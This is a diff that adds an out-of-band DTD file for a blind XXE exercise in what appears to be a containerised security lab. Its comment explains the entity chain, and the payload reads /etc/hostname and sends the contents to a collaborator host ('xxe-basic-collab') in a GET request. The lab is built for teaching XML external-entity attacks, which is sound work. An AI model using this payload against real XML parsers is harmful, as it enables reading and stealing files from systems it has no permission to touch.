@@ -1,0 +1,20 @@
+<!-- Out-of-band DTD for the blind-XXE scenario in the xxe-basic lab.
+
+     The lab's /upload-blind.php endpoint parses an attacker-controlled XML
+     body with external-entity loading enabled. The body declares a single
+     parameter entity that loads THIS file. Inside this file we chain
+     parameter entities:
+
+       %file   reads a local file from the victim container.
+       %eval   constructs a new parameter entity %exfil whose value is a
+               URL pointing back at this collaborator with the file
+               contents in the path.
+       %exfil  is forced to evaluate, causing libxml to issue the GET.
+
+     The collaborator logs the path, so the exfiltrated bytes appear in
+     `docker compose logs xxe-basic-collab`.
+-->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://xxe-basic-collab/?leak=%file;'>">
+%eval;
+%exfil;
